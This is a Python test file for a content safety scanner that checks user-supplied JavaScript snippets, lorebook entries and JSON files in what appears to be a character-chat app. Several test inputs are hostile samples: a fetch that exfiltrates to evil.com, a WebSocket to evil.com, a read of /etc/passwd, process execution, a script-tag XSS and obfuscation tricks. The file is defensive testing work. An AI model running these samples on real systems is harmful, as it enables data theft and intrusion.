from app.services.safety_scanner import (
    scan_cantrip,
    scan_file,
    scan_lorebook,
)

# ============================================================================
# Cantrip Scanning
# ============================================================================

class TestScanCantrip:
    def test_clean_code(self):
        result = scan_cantrip("context.character.scenario += ' Hello world';")
        assert result.safe
        assert result.max_severity == "clean"

    def test_network_access_fetch(self):
        result = scan_cantrip("fetch('https://evil.com/exfil')")
        assert not result.safe
        assert result.max_severity == "critical"
        assert any("fetch" in f.description for f in result.findings)

    def test_network_access_websocket(self):
        result = scan_cantrip("const ws = new WebSocket('wss://evil.com');")
        assert not result.safe
        assert "WebSocket" in result.findings[0].description

    def test_filesystem_access(self):
        result = scan_cantrip("Deno.readFile('/etc/passwd')")
        assert not result.safe
        assert "Filesystem" in result.findings[0].description

    def test_process_execution(self):
        result = scan_cantrip("Deno.run({cmd: ['ls']})")
        assert not result.safe
        assert "Process" in result.findings[0].description

    def test_eval_warning(self):
        result = scan_cantrip("eval('malicious code')")
        assert result.safe
        assert result.max_severity == "warning"
        assert any("eval" in f.description for f in result.findings)

    def test_external_url_warning(self):
        result = scan_cantrip("const url = 'https://example.com/api';")
        assert result.safe
        assert result.max_severity == "warning"

    def test_infinite_loop_warning(self):
        result = scan_cantrip("while(true) { doSomething(); }")
        assert result.safe
        assert result.max_severity == "warning"

    def test_large_content_warning(self):
        result = scan_cantrip("x" * 60000)
        assert result.safe
        assert result.max_severity == "warning"
        assert any("Large" in f.description for f in result.findings)

    def test_line_numbers(self):
        result = scan_cantrip("line1\nline2\nfetch('bad')")
        critical = [f for f in result.findings if f.severity == "critical"]
        assert len(critical) > 0
        assert critical[0].line == 3

    def test_summary_format(self):
        result = scan_cantrip("fetch('bad'); eval('worse');")
        assert "critical" in result.summary
        assert "warning" in result.summary

    def test_multiple_critical(self):
        result = scan_cantrip("fetch('bad'); Deno.readFile('x'); Deno.run({cmd:[]})")
        assert not result.safe
        criticals = [f for f in result.findings if f.severity == "critical"]
        assert len(criticals) >= 3


# ============================================================================
# Obfuscation / Smuggling Pattern Scanning
# ============================================================================

class TestScanObfuscation:
    def test_worker_critical(self):
        result = scan_cantrip("const w = new Worker('data:text/javascript,...');")
        assert not result.safe
        assert any("Worker" in f.description for f in result.findings)

    def test_service_worker_critical(self):
        result = scan_cantrip("navigator.serviceWorker.register('/sw.js');")
        assert not result.safe

    def test_atob_warning(self):
        result = scan_cantrip("const decoded = atob('aGVsbG8=');")
        assert result.safe
        assert any("atob" in f.description for f in result.findings)

    def test_chained_hex_escapes_warning(self):
        result = scan_cantrip('const s = "\\x65\\x76\\x69\\x6c\\x63\\x6f\\x64\\x65";')
        assert result.safe
        assert any("hex" in f.description for f in result.findings)

    def test_chained_unicode_escapes_warning(self):
        result = scan_cantrip('const s = "\\u0065\\u0076\\u0069\\u006c\\u0063\\u006f";')
        assert result.safe
        assert any("unicode" in f.description for f in result.findings)

    def test_fromcharcode_chain_warning(self):
        result = scan_cantrip(
            "eval(String.fromCharCode(97,108,101,114,116) + String.fromCharCode(40,41) "
            "+ String.fromCharCode(59))"
        )
        assert any("fromCharCode" in f.description for f in result.findings)

    def test_long_base64_blob_warning(self):
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk="
        result = scan_cantrip(f"const payload = '{blob}';")
        assert result.safe
        assert any("base64" in f.description for f in result.findings)

    def test_prototype_pollution_warning(self):
        result = scan_cantrip("obj.__proto__.polluted = true;")
        assert result.safe
        assert any("prototype pollution" in f.description for f in result.findings)

    def test_clean_code_no_obfuscation_findings(self):
        result = scan_cantrip("context.character.scenario += ' A calm evening in the tavern.';")
        assert result.safe
        assert result.max_severity == "clean"


# ============================================================================
# Lorebook Scanning
# ============================================================================

class TestScanLorebook:
    def test_clean_lorebook(self):
        entries = [{"name": "Location", "content": "The tavern is warm and welcoming."}]
        result = scan_lorebook(entries)
        assert result.safe

    def test_large_entry_warning(self):
        entries = [{"name": "Big", "content": "x" * 60000}]
        result = scan_lorebook(entries)
        assert result.safe
        assert result.max_severity == "warning"

    def test_script_tag_critical(self):
        entries = [{"name": "Bad", "content": "Some text <script>alert('xss')</script>"}]
        result = scan_lorebook(entries)
        assert not result.safe
        assert result.max_severity == "critical"

    def test_empty_entries(self):
        result = scan_lorebook([])
        assert result.safe


# ============================================================================
# File Scanning (JSON wrapper)
# ============================================================================

class TestScanFile:
    def test_valid_cantrip_json(self):
        raw = '{"name": "Test", "code": "context.character.scenario += \'hello\';"}'
        result = scan_file(raw, "cantrip")
        assert result.safe

    def test_cantrip_with_network(self):
        raw = '{"name": "Bad", "code": "fetch(\'https://evil.com\')"}'
        result = scan_file(raw, "cantrip")
        assert not result.safe

    def test_invalid_json(self):
        result = scan_file("not json", "cantrip")
        assert not result.safe
        assert "Invalid JSON" in result.findings[0].description

    def test_valid_lorebook_json(self):
        raw = '{"name": "LB", "entries": [{"name": "E1", "content": "safe content"}]}'
        result = scan_file(raw, "lorebook")
        assert result.safe

    def test_unknown_type(self):
        raw = '{"name": "X"}'
        result = scan_file(raw, "unknown_type")
        assert result.safe
